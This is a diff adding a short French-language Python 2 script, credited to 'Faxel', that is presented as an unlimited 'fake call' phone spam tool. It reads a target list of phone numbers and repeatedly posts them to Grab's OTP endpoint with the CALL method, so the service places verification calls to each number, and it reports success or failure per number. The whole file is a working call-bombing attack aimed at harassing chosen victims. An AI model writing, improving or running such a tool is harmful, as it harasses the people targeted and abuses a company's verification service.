@@ -1,0 +1,26 @@
+import os
+from time import sleep
+try:
+	import requests
+except:
+	os.system("pip2 install requests;pip install requests")
+print("""
+	      [ Appel fake python 
+	      [ Type de spam : telepone
+	      [ Illimité     : oui
+	      [ Auteur       : Faxel
+""")
+numero = raw_input("Entrer le numero de votre cible : ")
+try:
+	Lancement = open(numero).readlines()
+except:
+	print("N'a pas joindre: ",numero,"veuillez ressayez")
+	exit()
+for x in Lancement:
+	numeros =x.replace("00","225").replace("\n","")
+	requete= requests.post("https://api.grab.com/grabid/v1/phone/otp",data={"method":"CALL","countryCode":"id","phoneNumber":numeros,"templateID":"pax_android_production"}).text
+	if requete !="errors":
+		print(" Appel fake reussie vers    : "+str(numeros))
+	else:
+		print(" Echec de l'appel fake vers : "+str(numeros))
+print("A plus Mec, N'oublie de t abonner a ma chaine youtube.")
